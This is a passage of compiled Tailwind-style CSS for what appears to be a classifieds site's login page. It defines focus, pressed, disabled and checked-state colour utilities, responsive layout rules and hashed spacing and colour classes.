      .focus-visible\:relative:focus-visible {
        position: relative;
      }

      .focus-visible\:z-raised:focus-visible {
        z-index: var(--z-index-raised);
      }

      .focus-visible\:bg-accent-container-focused:focus-visible {
        --tw-bg-opacity: 1;
        background-color: rgb(
          var(--colors-accent-container-focused) / var(--tw-bg-opacity)
        );
      }

      .focus-visible\:bg-accent-focused:focus-visible {
        --tw-bg-opacity: 1;
        background-color: rgb(
          var(--colors-accent-focused) / var(--tw-bg-opacity)
        );
      }

      .focus-visible\:bg-accent\/dim-5:focus-visible {
        background-color: rgb(var(--colors-accent) / var(--opacity-dim-5));
      }

      .focus-visible\:bg-alert-container-focused:focus-visible {
        --tw-bg-opacity: 1;
        background-color: rgb(
          var(--colors-alert-container-focused) / var(--tw-bg-opacity)
        );
      }

      .focus-visible\:bg-alert-focused:focus-visible {
        --tw-bg-opacity: 1;
        background-color: rgb(
          var(--colors-alert-focused) / var(--tw-bg-opacity)
        );
      }

      .focus-visible\:bg-alert\/dim-5:focus-visible {
        background-color: rgb(var(--colors-alert) / var(--opacity-dim-5));
      }

      .focus-visible\:bg-basic-container-focused:focus-visible {
        --tw-bg-opacity: 1;
        background-color: rgb(
          var(--colors-basic-container-focused) / var(--tw-bg-opacity)
        );
      }

      .focus-visible\:bg-basic-focused:focus-visible {
        --tw-bg-opacity: 1;
        background-color: rgb(
          var(--colors-basic-focused) / var(--tw-bg-opacity)
        );
      }

      .focus-visible\:bg-basic\/dim-5:focus-visible {
        background-color: rgb(var(--colors-basic) / var(--opacity-dim-5));
      }

      .focus-visible\:bg-error-container-focused:focus-visible {
        --tw-bg-opacity: 1;
        background-color: rgb(
          var(--colors-error-container-focused) / var(--tw-bg-opacity)
        );
      }

      .focus-visible\:bg-error-focused:focus-visible {
        --tw-bg-opacity: 1;
        background-color: rgb(
          var(--colors-error-focused) / var(--tw-bg-opacity)
        );
      }

      .focus-visible\:bg-error\/dim-5:focus-visible {
        background-color: rgb(var(--colors-error) / var(--opacity-dim-5));
      }

      .focus-visible\:bg-info-container-focused:focus-visible {
        --tw-bg-opacity: 1;
        background-color: rgb(
          var(--colors-info-container-focused) / var(--tw-bg-opacity)
        );
      }

      .focus-visible\:bg-info-focused:focus-visible {
        --tw-bg-opacity: 1;
        background-color: rgb(
          var(--colors-info-focused) / var(--tw-bg-opacity)
        );
      }

      .focus-visible\:bg-info\/dim-5:focus-visible {
        background-color: rgb(var(--colors-info) / var(--opacity-dim-5));
      }

      .focus-visible\:bg-main-container-focused:focus-visible {
        --tw-bg-opacity: 1;
        background-color: rgb(
          var(--colors-main-container-focused) / var(--tw-bg-opacity)
        );
      }

      .focus-visible\:bg-main-focused:focus-visible {
        --tw-bg-opacity: 1;
        background-color: rgb(
          var(--colors-main-focused) / var(--tw-bg-opacity)
        );
      }

      .focus-visible\:bg-main\/dim-5:focus-visible {
        background-color: rgb(var(--colors-main) / var(--opacity-dim-5));
      }

      .focus-visible\:bg-neutral-container-focused:focus-visible {
        --tw-bg-opacity: 1;
        background-color: rgb(
          var(--colors-neutral-container-focused) / var(--tw-bg-opacity)
        );
      }

      .focus-visible\:bg-neutral-focused:focus-visible {
        --tw-bg-opacity: 1;
        background-color: rgb(
          var(--colors-neutral-focused) / var(--tw-bg-opacity)
        );
      }

      .focus-visible\:bg-neutral\/dim-5:focus-visible {
        background-color: rgb(var(--colors-neutral) / var(--opacity-dim-5));
      }

      .focus-visible\:bg-success-container-focused:focus-visible {
        --tw-bg-opacity: 1;
        background-color: rgb(
          var(--colors-success-container-focused) / var(--tw-bg-opacity)
        );
      }

      .focus-visible\:bg-success-focused:focus-visible {
        --tw-bg-opacity: 1;
        background-color: rgb(
          var(--colors-success-focused) / var(--tw-bg-opacity)
        );
      }

      .focus-visible\:bg-success\/dim-5:focus-visible {
        background-color: rgb(var(--colors-success) / var(--opacity-dim-5));
      }

      .focus-visible\:bg-support-container-focused:focus-visible {
        --tw-bg-opacity: 1;
        background-color: rgb(
          var(--colors-support-container-focused) / var(--tw-bg-opacity)
        );
      }

      .focus-visible\:bg-support-focused:focus-visible {
        --tw-bg-opacity: 1;
        background-color: rgb(
          var(--colors-support-focused) / var(--tw-bg-opacity)
        );
      }

      .focus-visible\:bg-support\/dim-5:focus-visible {
        background-color: rgb(var(--colors-support) / var(--opacity-dim-5));
      }

      .focus-visible\:bg-surface-focused:focus-visible {
        --tw-bg-opacity: 1;
        background-color: rgb(
          var(--colors-surface-focused) / var(--tw-bg-opacity)
        );
      }

      .focus-visible\:bg-surface\/dim-5:focus-visible {
        background-color: rgb(var(--colors-surface) / var(--opacity-dim-5));
      }

      .focus-visible\:underline:focus-visible {
        -webkit-text-decoration-line: underline;
        text-decoration-line: underline;
      }

      .focus-visible\:outline-none:focus-visible {
        outline: 2px solid #0000;
        outline-offset: 2px;
      }

      .focus-visible\:ring-2:focus-visible {
        --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0
          var(--tw-ring-offset-width) var(--tw-ring-offset-color);
        --tw-ring-shadow: var(--tw-ring-inset) 0 0 0
          calc(2px + var(--tw-ring-offset-width)) var(--tw-ring-color);
        -webkit-box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow),
          var(--tw-shadow, 0 0 #0000);
        box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow),
          var(--tw-shadow, 0 0 #0000);
      }

      .focus-visible\:ring-on-surface:focus-visible {
        --tw-ring-opacity: 1;
        --tw-ring-color: rgb(var(--colors-on-surface) / var(--tw-ring-opacity));
      }

      .focus-visible\:ring-outline-high:focus-visible {
        --tw-ring-opacity: 1;
        --tw-ring-color: rgb(
          var(--colors-outline-high) / var(--tw-ring-opacity)
        );
      }

      .enabled\:active\:bg-accent-container-pressed:active:enabled {
        --tw-bg-opacity: 1;
        background-color: rgb(
          var(--colors-accent-container-pressed) / var(--tw-bg-opacity)
        );
      }

      .enabled\:active\:bg-accent-pressed:active:enabled {
        --tw-bg-opacity: 1;
        background-color: rgb(
          var(--colors-accent-pressed) / var(--tw-bg-opacity)
        );
      }

      .enabled\:active\:bg-accent\/dim-5:active:enabled {
        background-color: rgb(var(--colors-accent) / var(--opacity-dim-5));
      }

      .enabled\:active\:bg-alert-container-pressed:active:enabled {
        --tw-bg-opacity: 1;
        background-color: rgb(
          var(--colors-alert-container-pressed) / var(--tw-bg-opacity)
        );
      }

      .enabled\:active\:bg-alert-pressed:active:enabled {
        --tw-bg-opacity: 1;
        background-color: rgb(
          var(--colors-alert-pressed) / var(--tw-bg-opacity)
        );
      }

      .enabled\:active\:bg-alert\/dim-5:active:enabled {
        background-color: rgb(var(--colors-alert) / var(--opacity-dim-5));
      }

      .enabled\:active\:bg-basic-container-pressed:active:enabled {
        --tw-bg-opacity: 1;
        background-color: rgb(
          var(--colors-basic-container-pressed) / var(--tw-bg-opacity)
        );
      }

      .enabled\:active\:bg-basic-pressed:active:enabled {
        --tw-bg-opacity: 1;
        background-color: rgb(
          var(--colors-basic-pressed) / var(--tw-bg-opacity)
        );
      }

      .enabled\:active\:bg-basic\/dim-5:active:enabled {
        background-color: rgb(var(--colors-basic) / var(--opacity-dim-5));
      }

      .enabled\:active\:bg-error-container-pressed:active:enabled {
        --tw-bg-opacity: 1;
        background-color: rgb(
          var(--colors-error-container-pressed) / var(--tw-bg-opacity)
        );
      }

      .enabled\:active\:bg-error-pressed:active:enabled {
        --tw-bg-opacity: 1;
        background-color: rgb(
          var(--colors-error-pressed) / var(--tw-bg-opacity)
        );
      }

      .enabled\:active\:bg-error\/dim-5:active:enabled {
        background-color: rgb(var(--colors-error) / var(--opacity-dim-5));
      }

      .enabled\:active\:bg-info-container-pressed:active:enabled {
        --tw-bg-opacity: 1;
        background-color: rgb(
          var(--colors-info-container-pressed) / var(--tw-bg-opacity)
        );
      }

      .enabled\:active\:bg-info-pressed:active:enabled {
        --tw-bg-opacity: 1;
        background-color: rgb(
          var(--colors-info-pressed) / var(--tw-bg-opacity)
        );
      }

      .enabled\:active\:bg-info\/dim-5:active:enabled {
        background-color: rgb(var(--colors-info) / var(--opacity-dim-5));
      }

      .enabled\:active\:bg-main-container-pressed:active:enabled {
        --tw-bg-opacity: 1;
        background-color: rgb(
          var(--colors-main-container-pressed) / var(--tw-bg-opacity)
        );
      }

      .enabled\:active\:bg-main-pressed:active:enabled {
        --tw-bg-opacity: 1;
        background-color: rgb(
          var(--colors-main-pressed) / var(--tw-bg-opacity)
        );
      }

      .enabled\:active\:bg-main\/dim-5:active:enabled {
        background-color: rgb(var(--colors-main) / var(--opacity-dim-5));
      }

      .enabled\:active\:bg-neutral-container-pressed:active:enabled {
        --tw-bg-opacity: 1;
        background-color: rgb(
          var(--colors-neutral-container-pressed) / var(--tw-bg-opacity)
        );
      }

      .enabled\:active\:bg-neutral-pressed:active:enabled {
        --tw-bg-opacity: 1;
        background-color: rgb(
          var(--colors-neutral-pressed) / var(--tw-bg-opacity)
        );
      }

      .enabled\:active\:bg-neutral\/dim-5:active:enabled {
        background-color: rgb(var(--colors-neutral) / var(--opacity-dim-5));
      }

      .enabled\:active\:bg-success-container-pressed:active:enabled {
        --tw-bg-opacity: 1;
        background-color: rgb(
          var(--colors-success-container-pressed) / var(--tw-bg-opacity)
        );
      }

      .enabled\:active\:bg-success-pressed:active:enabled {
        --tw-bg-opacity: 1;
        background-color: rgb(
          var(--colors-success-pressed) / var(--tw-bg-opacity)
        );
      }

      .enabled\:active\:bg-success\/dim-5:active:enabled {
        background-color: rgb(var(--colors-success) / var(--opacity-dim-5));
      }

      .enabled\:active\:bg-support-container-pressed:active:enabled {
        --tw-bg-opacity: 1;
        background-color: rgb(
          var(--colors-support-container-pressed) / var(--tw-bg-opacity)
        );
      }

      .enabled\:active\:bg-support-pressed:active:enabled {
        --tw-bg-opacity: 1;
        background-color: rgb(
          var(--colors-support-pressed) / var(--tw-bg-opacity)
        );
      }

      .enabled\:active\:bg-support\/dim-5:active:enabled {
        background-color: rgb(var(--colors-support) / var(--opacity-dim-5));
      }

      .enabled\:active\:bg-surface-pressed:active:enabled {
        --tw-bg-opacity: 1;
        background-color: rgb(
          var(--colors-surface-pressed) / var(--tw-bg-opacity)
        );
      }

      .enabled\:active\:bg-surface\/dim-5:active:enabled {
        background-color: rgb(var(--colors-surface) / var(--opacity-dim-5));
      }

      .disabled\:cursor-default:disabled {
        cursor: default;
      }

      .disabled\:cursor-not-allowed:disabled {
        cursor: not-allowed;
      }

      .disabled\:border-on-surface\/dim-3:disabled {
        border-color: rgb(var(--colors-on-surface) / var(--opacity-dim-3));
      }

      .disabled\:border-outline\/dim-2:disabled {
        border-color: rgb(var(--colors-outline) / var(--opacity-dim-2));
      }

      .disabled\:bg-on-surface\/dim-5:disabled {
        background-color: rgb(var(--colors-on-surface) / var(--opacity-dim-5));
      }

      .disabled\:text-on-surface\/dim-3:disabled {
        color: rgb(var(--colors-on-surface) / var(--opacity-dim-3));
      }

      .disabled\:ring-outline:disabled {
        --tw-ring-opacity: 1;
        --tw-ring-color: rgb(var(--colors-outline) / var(--tw-ring-opacity));
      }

      .disabled\:hover\:ring-transparent:hover:disabled {
        --tw-ring-color: #0000;
      }

      .peer:hover ~ .peer-hover\:border-outline-high {
        --tw-border-opacity: 1;
        border-color: rgb(
          var(--colors-outline-high) / var(--tw-border-opacity)
        );
      }

      .peer:focus ~ .peer-focus\:border-md {
        border-width: var(--border-width-md);
      }

      .peer:focus ~ .peer-focus\:border-outline-high {
        --tw-border-opacity: 1;
        border-color: rgb(
          var(--colors-outline-high) / var(--tw-border-opacity)
        );
      }

      .peer:focus ~ .peer-focus\:text-outline-high {
        --tw-text-opacity: 1;
        color: rgb(var(--colors-outline-high) / var(--tw-text-opacity));
      }

      .peer:disabled:hover
        ~ .peer-disabled\:peer-hover\:border-on-surface\/dim-3,
      .peer:disabled ~ .peer-disabled\:border-on-surface\/dim-3 {
        border-color: rgb(var(--colors-on-surface) / var(--opacity-dim-3));
      }

      .spark-disabled\:cursor-not-allowed[data-disabled] {
        cursor: not-allowed;
      }

      .spark-disabled\:opacity-dim-3[data-disabled] {
        opacity: var(--opacity-dim-3);
      }

      .spark-disabled\:hover\:ring-0:hover[data-disabled] {
        --tw-ring-offset-shadow: var(--tw-ring-inset) 0 0 0
          var(--tw-ring-offset-width) var(--tw-ring-offset-color);
        --tw-ring-shadow: var(--tw-ring-inset) 0 0 0
          calc(var(--tw-ring-offset-width)) var(--tw-ring-color);
        -webkit-box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow),
          var(--tw-shadow, 0 0 #0000);
        box-shadow: var(--tw-ring-offset-shadow), var(--tw-ring-shadow),
          var(--tw-shadow, 0 0 #0000);
      }

      .spark-state-checked\:w-full[data-state="checked"] {
        width: 100%;
      }

      .spark-state-checked\:border-accent[data-state="checked"] {
        --tw-border-opacity: 1;
        border-color: rgb(var(--colors-accent) / var(--tw-border-opacity));
      }

      .spark-state-checked\:border-alert[data-state="checked"] {
        --tw-border-opacity: 1;
        border-color: rgb(var(--colors-alert) / var(--tw-border-opacity));
      }

      .spark-state-checked\:border-basic[data-state="checked"] {
        --tw-border-opacity: 1;
        border-color: rgb(var(--colors-basic) / var(--tw-border-opacity));
      }

      .spark-state-checked\:border-error[data-state="checked"] {
        --tw-border-opacity: 1;
        border-color: rgb(var(--colors-error) / var(--tw-border-opacity));
      }

      .spark-state-checked\:border-info[data-state="checked"] {
        --tw-border-opacity: 1;
        border-color: rgb(var(--colors-info) / var(--tw-border-opacity));
      }

      .spark-state-checked\:border-main[data-state="checked"] {
        --tw-border-opacity: 1;
        border-color: rgb(var(--colors-main) / var(--tw-border-opacity));
      }

      .spark-state-checked\:border-neutral[data-state="checked"] {
        --tw-border-opacity: 1;
        border-color: rgb(var(--colors-neutral) / var(--tw-border-opacity));
      }

      .spark-state-checked\:border-success[data-state="checked"] {
        --tw-border-opacity: 1;
        border-color: rgb(var(--colors-success) / var(--tw-border-opacity));
      }

      .spark-state-checked\:border-support[data-state="checked"] {
        --tw-border-opacity: 1;
        border-color: rgb(var(--colors-support) / var(--tw-border-opacity));
      }

      .spark-state-checked\:bg-accent[data-state="checked"] {
        --tw-bg-opacity: 1;
        background-color: rgb(var(--colors-accent) / var(--tw-bg-opacity));
      }

      .spark-state-checked\:bg-alert[data-state="checked"] {
        --tw-bg-opacity: 1;
        background-color: rgb(var(--colors-alert) / var(--tw-bg-opacity));
      }

      .spark-state-checked\:bg-basic[data-state="checked"] {
        --tw-bg-opacity: 1;
        background-color: rgb(var(--colors-basic) / var(--tw-bg-opacity));
      }

      .spark-state-checked\:bg-error[data-state="checked"] {
        --tw-bg-opacity: 1;
        background-color: rgb(var(--colors-error) / var(--tw-bg-opacity));
      }

      .spark-state-checked\:bg-info[data-state="checked"] {
        --tw-bg-opacity: 1;
        background-color: rgb(var(--colors-info) / var(--tw-bg-opacity));
      }

      .spark-state-checked\:bg-main[data-state="checked"] {
        --tw-bg-opacity: 1;
        background-color: rgb(var(--colors-main) / var(--tw-bg-opacity));
      }

      .spark-state-checked\:bg-neutral[data-state="checked"] {
        --tw-bg-opacity: 1;
        background-color: rgb(var(--colors-neutral) / var(--tw-bg-opacity));
      }

      .spark-state-checked\:bg-success[data-state="checked"] {
        --tw-bg-opacity: 1;
        background-color: rgb(var(--colors-success) / var(--tw-bg-opacity));
      }

      .spark-state-checked\:bg-support[data-state="checked"] {
        --tw-bg-opacity: 1;
        background-color: rgb(var(--colors-support) / var(--tw-bg-opacity));
      }

      .after\:spark-state-checked\:h-full[data-state="checked"]:after {
        content: var(--tw-content);
        height: 100%;
      }

      .after\:spark-state-checked\:w-full[data-state="checked"]:after {
        content: var(--tw-content);
        width: 100%;
      }

      .spark-state-indeterminate\:border-accent[data-state="indeterminate"] {
        --tw-border-opacity: 1;
        border-color: rgb(var(--colors-accent) / var(--tw-border-opacity));
      }

      .spark-state-indeterminate\:border-alert[data-state="indeterminate"] {
        --tw-border-opacity: 1;
        border-color: rgb(var(--colors-alert) / var(--tw-border-opacity));
      }

      .spark-state-indeterminate\:border-basic[data-state="indeterminate"] {
        --tw-border-opacity: 1;
        border-color: rgb(var(--colors-basic) / var(--tw-border-opacity));
      }

      .spark-state-indeterminate\:border-error[data-state="indeterminate"] {
        --tw-border-opacity: 1;
        border-color: rgb(var(--colors-error) / var(--tw-border-opacity));
      }

      .spark-state-indeterminate\:border-info[data-state="indeterminate"] {
        --tw-border-opacity: 1;
        border-color: rgb(var(--colors-info) / var(--tw-border-opacity));
      }

      .spark-state-indeterminate\:border-main[data-state="indeterminate"] {
        --tw-border-opacity: 1;
        border-color: rgb(var(--colors-main) / var(--tw-border-opacity));
      }

      .spark-state-indeterminate\:border-neutral[data-state="indeterminate"] {
        --tw-border-opacity: 1;
        border-color: rgb(var(--colors-neutral) / var(--tw-border-opacity));
      }

      .spark-state-indeterminate\:border-success[data-state="indeterminate"] {
        --tw-border-opacity: 1;
        border-color: rgb(var(--colors-success) / var(--tw-border-opacity));
      }

      .spark-state-indeterminate\:border-support[data-state="indeterminate"] {
        --tw-border-opacity: 1;
        border-color: rgb(var(--colors-support) / var(--tw-border-opacity));
      }

      .spark-state-indeterminate\:bg-accent[data-state="indeterminate"] {
        --tw-bg-opacity: 1;
        background-color: rgb(var(--colors-accent) / var(--tw-bg-opacity));
      }

      .spark-state-indeterminate\:bg-alert[data-state="indeterminate"] {
        --tw-bg-opacity: 1;
        background-color: rgb(var(--colors-alert) / var(--tw-bg-opacity));
      }

      .spark-state-indeterminate\:bg-basic[data-state="indeterminate"] {
        --tw-bg-opacity: 1;
        background-color: rgb(var(--colors-basic) / var(--tw-bg-opacity));
      }

      .spark-state-indeterminate\:bg-error[data-state="indeterminate"] {
        --tw-bg-opacity: 1;
        background-color: rgb(var(--colors-error) / var(--tw-bg-opacity));
      }

      .spark-state-indeterminate\:bg-info[data-state="indeterminate"] {
        --tw-bg-opacity: 1;
        background-color: rgb(var(--colors-info) / var(--tw-bg-opacity));
      }

      .spark-state-indeterminate\:bg-main[data-state="indeterminate"] {
        --tw-bg-opacity: 1;
        background-color: rgb(var(--colors-main) / var(--tw-bg-opacity));
      }

      .spark-state-indeterminate\:bg-neutral[data-state="indeterminate"] {
        --tw-bg-opacity: 1;
        background-color: rgb(var(--colors-neutral) / var(--tw-bg-opacity));
      }

      .spark-state-indeterminate\:bg-success[data-state="indeterminate"] {
        --tw-bg-opacity: 1;
        background-color: rgb(var(--colors-success) / var(--tw-bg-opacity));
      }

      .spark-state-indeterminate\:bg-support[data-state="indeterminate"] {
        --tw-bg-opacity: 1;
        background-color: rgb(var(--colors-support) / var(--tw-bg-opacity));
      }

      .spark-state-unchecked\:border-alert[data-state="unchecked"] {
        --tw-border-opacity: 1;
        border-color: rgb(var(--colors-alert) / var(--tw-border-opacity));
      }

      .spark-state-unchecked\:border-error[data-state="unchecked"] {
        --tw-border-opacity: 1;
        border-color: rgb(var(--colors-error) / var(--tw-border-opacity));
      }

      .spark-state-unchecked\:border-info[data-state="unchecked"] {
        --tw-border-opacity: 1;
        border-color: rgb(var(--colors-info) / var(--tw-border-opacity));
      }

      .spark-state-unchecked\:border-neutral[data-state="unchecked"] {
        --tw-border-opacity: 1;
        border-color: rgb(var(--colors-neutral) / var(--tw-border-opacity));
      }

      .spark-state-unchecked\:border-outline[data-state="unchecked"] {
        --tw-border-opacity: 1;
        border-color: rgb(var(--colors-outline) / var(--tw-border-opacity));
      }

      .spark-state-unchecked\:border-success[data-state="unchecked"] {
        --tw-border-opacity: 1;
        border-color: rgb(var(--colors-success) / var(--tw-border-opacity));
      }

      @media not all and (min-width: 768px) {
        .max-md\:h-full {
          height: 100%;
        }
      }

      @media (min-width: 320px) {
        .min-\[320px\]\:block {
          display: block;
        }
      }

      @media (min-width: 640px) {
        .sm\:left-3xl {
          left: var(--spacing-3xl);
        }

        .sm\:top-lg {
          top: var(--spacing-lg);
        }

        .sm\:mt-3xl {
          margin-top: var(--spacing-3xl);
        }

        .sm\:mt-lg {
          margin-top: var(--spacing-lg);
        }

        .sm\:block {
          display: block;
        }

        .sm\:h-2xl {
          height: var(--spacing-2xl);
        }

        .sm\:w-auto {
          width: var(--spacing-auto);
        }

        .sm\:w-sz-480 {
          width: var(--sz-480);
        }

        .sm\:grid-rows-wide-page {
          grid-template-rows: 6rem 1fr;
        }

        .sm\:border-t-none {
          border-top-width: var(--border-width-none);
        }

        .sm\:py-none {
          padding-top: var(--spacing-none);
          padding-bottom: var(--spacing-none);
        }
      }

      @media (min-width: 768px) {
        .md\:m-3xl {
          margin: var(--spacing-3xl);
        }

        .md\:m-auto {
          margin: var(--spacing-auto);
        }

        .md\:mr-xl {
          margin-right: var(--spacing-xl);
        }

        .md\:mt-3xl {
          margin-top: var(--spacing-3xl);
        }

        .md\:mt-\[56px\] {
          margin-top: 56px;
        }

        .md\:block {
          display: block;
        }

        .md\:flex {
          display: -webkit-flex;
          display: -ms-flexbox;
          display: flex;
        }

        .md\:hidden {
          display: none;
        }

        .md\:h-\[calc\(100\%-60px\)\] {
          height: calc(100% - 60px);
        }

        .md\:w-1\/2 {
          width: 50%;
        }

        .md\:w-auto {
          width: var(--spacing-auto);
        }

        .md\:w-fit {
          width: -webkit-fit-content;
          width: -moz-fit-content;
          width: fit-content;
        }

        .md\:min-w-\[50px\] {
          min-width: 50px;
        }

        .md\:\!max-w-full {
          max-width: 100% !important;
        }

        .md\:max-w-3xl {
          max-width: 48rem;
        }

        .md\:flex-1 {
          -webkit-flex: 1 1;
          -ms-flex: 1 1;
          flex: 1 1;
        }

        .md\:flex-none {
          -webkit-flex: none;
          -ms-flex: none;
          flex: none;
        }

        .md\:grid-cols-11 {
          grid-template-columns: repeat(11, minmax(0, 1fr));
        }

        .md\:flex-row-reverse {
          -webkit-flex-direction: row-reverse;
          -ms-flex-direction: row-reverse;
          flex-direction: row-reverse;
        }

        .md\:justify-start {
          -webkit-justify-content: flex-start;
          -ms-flex-pack: start;
          justify-content: flex-start;
        }

        .md\:gap-3xl {
          gap: var(--spacing-3xl);
        }

        .md\:gap-auto {
          gap: var(--spacing-auto);
        }

        .md\:gap-md {
          gap: var(--spacing-md);
        }

        .md\:rounded-lg {
          border-radius: var(--border-radius-lg);
        }

        .md\:bg-background {
          --tw-bg-opacity: 1;
          background-color: rgb(
            var(--colors-background) / var(--tw-bg-opacity)
          );
        }

        .md\:bg-\[url\(\/static\/adevinta\/illustration-part\.svg\)\] {
          background-image: url(/static/adevinta/illustration-part.svg);
        }

        .md\:bg-\[url\(\/static\/adevinta\/illustration-pro\.svg\)\] {
          background-image: url(/static/adevinta/illustration-pro.svg);
        }

        .md\:bg-\[url\(\/static\/kleinanzeigen\/illustration\.svg\)\] {
          background-image: url(/static/kleinanzeigen/illustration.svg);
        }

        .md\:bg-\[url\(\/static\/login-illustration-pro\.svg\)\] {
          background-image: url(/static/login-illustration-pro.svg);
        }

        .md\:bg-\[url\(\/static\/login-illustration\.png\)\] {
          background-image: url(/static/login-illustration.png);
        }

        .md\:bg-\[length\:980px\] {
          background-size: 980px;
        }

        .md\:bg-bottom {
          background-position: bottom;
        }

        .md\:bg-no-repeat {
          background-repeat: no-repeat;
        }

        .md\:p-2xl {
          padding: var(--spacing-2xl);
        }

        .md\:px-\[88px\] {
          padding-left: 88px;
          padding-right: 88px;
        }

        .md\:pb-2xl {
          padding-bottom: var(--spacing-2xl);
        }

        .md\:pl-2xl {
          padding-left: var(--spacing-2xl);
        }

        .md\:pr-2xl {
          padding-right: var(--spacing-2xl);
        }

        .md\:pt-2xl {
          padding-top: var(--spacing-2xl);
        }

        .md\:shadow {
          --tw-shadow: var(--box-shadow-default);
          --tw-shadow-colored: var(--box-shadow-default);
          -webkit-box-shadow: var(--tw-ring-offset-shadow, 0 0 #0000),
            var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow);
          box-shadow: var(--tw-ring-offset-shadow, 0 0 #0000),
            var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow);
        }
      }

      @media (min-width: 1024px) {
        .lg\:max-w-lg {
          max-width: 32rem;
        }
      }

      .\[\&\:not\(\:focus-visible\)\]\:ring-inset:not(:focus-visible) {
        --tw-ring-inset: inset;
      }

      ._1UH6n {
        margin: auto;
      }

      ._35g97 {
        padding: auto;
      }

      ._3T4fR {
        margin: 0;
      }

      ._3Q3XS {
        padding: 0;
      }

      ._1-yt0 {
        margin: 0.4rem;
      }

      ._3-ME7 {
        padding: 0.4rem;
      }

      ._3clkK {
        margin: 0.8rem;
      }

      .qgq0I {
        padding: 0.8rem;
      }

      ._2SACt {
        margin: 1.6rem;
      }

      ._3v7TL {
        padding: 1.6rem;
      }

      ._2ZACC {
        margin: 2.4rem;
      }

      ._2z4WR {
        padding: 2.4rem;
      }

      ._1auHB {
        margin: 3.2rem;
      }

      .aMiLf {
        padding: 3.2rem;
      }

      .P7AUg {
        margin: 4rem;
      }

      ._1xWHz {
        padding: 4rem;
      }

      ._3LBsm {
        margin-top: auto;
      }

      ._26oIq {
        padding-top: auto;
      }

      ._282XL {
        margin-right: auto;
      }

      ._11wdq {
        padding-right: auto;
      }

      ._3XTMK {
        margin-bottom: auto;
      }

      ._1lfsB {
        padding-bottom: auto;
      }

      ._2adxl {
        margin-left: auto;
      }

      ._23qcA {
        padding-left: auto;
      }

      ._25dUs {
        margin-top: 0;
      }

      ._3XinI {
        padding-top: 0;
      }

      ._1m2vi {
        margin-right: 0;
      }

      ._3OFYf {
        padding-right: 0;
      }

      .-HQxY {
        margin-bottom: 0;
      }

      .WaP_Z {
        padding-bottom: 0;
      }

      ._3FpaQ {
        margin-left: 0;
      }

      ._2fBkv {
        padding-left: 0;
      }

      ._2TX6E {
        margin-top: 0.4rem;
      }

      ._3x0kP {
        padding-top: 0.4rem;
      }

      ._3O6jB {
        margin-right: 0.4rem;
      }

      ._32til {
        padding-right: 0.4rem;
      }

      ._1pHkp {
        margin-bottom: 0.4rem;
      }

      ._PypL {
        padding-bottom: 0.4rem;
      }

      ._1uydM {
        margin-left: 0.4rem;
      }

      ._19GBp {
        padding-left: 0.4rem;
      }

      ._1rwR5 {
        margin-top: 0.8rem;
      }

      .Snj6Y {
        padding-top: 0.8rem;
      }

      ._3k87M {
        margin-right: 0.8rem;
      }

      .SWpW9 {
        padding-right: 0.8rem;
      }

      .HlrAk {
        margin-bottom: 0.8rem;
      }

      ._1oWhj {
        padding-bottom: 0.8rem;
      }

      .FUcqi {
        margin-left: 0.8rem;
      }

      ._30glL {
        padding-left: 0.8rem;
      }

      .HGqCc {
        margin-top: 1.6rem;
      }

      ._3Tuzm {
        padding-top: 1.6rem;
      }

      ._23jKN {
        margin-right: 1.6rem;
      }

      ._32ILh {
        padding-right: 1.6rem;
      }

      ._3c6yv {
        margin-bottom: 1.6rem;
      }

      ._3deLe {
        padding-bottom: 1.6rem;
      }

      ._2hbpZ {
        margin-left: 1.6rem;
      }

      ._2L9kx {
        padding-left: 1.6rem;
      }

      ._3q0nF {
        margin-top: 2.4rem;
      }

      ._1_1QY {
        padding-top: 2.4rem;
      }

      ._2WFYb {
        margin-right: 2.4rem;
      }

      ._11dBH {
        padding-right: 2.4rem;
      }

      ._1oejz {
        margin-bottom: 2.4rem;
      }

      ._1qvhT {
        padding-bottom: 2.4rem;
      }

      ._3_9fJ {
        margin-left: 2.4rem;
      }

      .sczyl {
        padding-left: 2.4rem;
      }

      .VbdLE {
        margin-top: 3.2rem;
      }

      ._1XviF {
        padding-top: 3.2rem;
      }

      ._26B0q {
        margin-right: 3.2rem;
      }

      ._1VBjc {
        padding-right: 3.2rem;
      }

      ._2BJFL {
        margin-bottom: 3.2rem;
      }

      .VHK4c {
        padding-bottom: 3.2rem;
      }

      ._3NcWq {
        margin-left: 3.2rem;
      }

      ._2KJ5z {
        padding-left: 3.2rem;
      }

      ._3AXPQ {
        margin-top: 4rem;
      }

      ._2_Xj4 {
        padding-top: 4rem;
      }

      ._2Ui0d {
        margin-right: 4rem;
      }

      ._2qhGo {
        padding-right: 4rem;
      }

      ._1gfMr {
        margin-bottom: 4rem;
      }

      ._34IPv {
        padding-bottom: 4rem;
      }

      ._1IhyN {
        margin-left: 4rem;
      }

      ._2j3Nb {
        padding-left: 4rem;
      }

      ._1J-MJ {
        color: #fff;
      }

      .kTOAf {
        background-color: #fff;
      }

      .yG4tT {
        border-color: #fff;
      }

      ._2V4-F:focus,
      ._33636:hover {
        color: #fff;
      }

      ._3FzjA:hover {
        background-color: #fff;
      }

      ._1HiAX:hover {
        border-color: #fff;
      }

      .Roh2X {
        color: #1a1a1a;
      }

      ._2Cwad {
        background-color: #1a1a1a;
      }

      ._3qGMj {
        border-color: #1a1a1a;
      }

      ._1WoAR:hover,
      ._3FXs9:focus {
        color: #1a1a1a;
      }

      .jc1Pq:hover {
        background-color: #1a1a1a;
      }

      .O7KMH:hover {
        border-color: #1a1a1a;
      }

      ._2yd8v {
        color: transparent;
      }

      ._29R_v {
        background-color: transparent;
      }

      .Eb4of {
        border-color: transparent;
      }

      ._3XVDN:hover,
      ._3_3Gh:focus {
        color: transparent;
      }

      ._2sH4b:hover {
        background-color: transparent;
      }

      ._3wIdE:hover {
        border-color: transparent;
      }

      .fizv5 {
        color: rgba(0, 0, 0, 0.5);
      }

      ._3QDqL {
        background-color: rgba(0, 0, 0, 0.5);
      }

      ._14PlC {
        border-color: rgba(0, 0, 0, 0.5);
      }

      ._3mTrs:focus,
      .eV-ss:hover {
        color: rgba(0, 0, 0, 0.5);
      }

      ._2fTpD:hover {
        background-color: rgba(0, 0, 0, 0.5);
      }

      .TIIIG:hover {
        border-color: rgba(0, 0, 0, 0.5);
      }

      .jR8Ts {
        color: #f4f6f7;
      }

      ._3W949 {
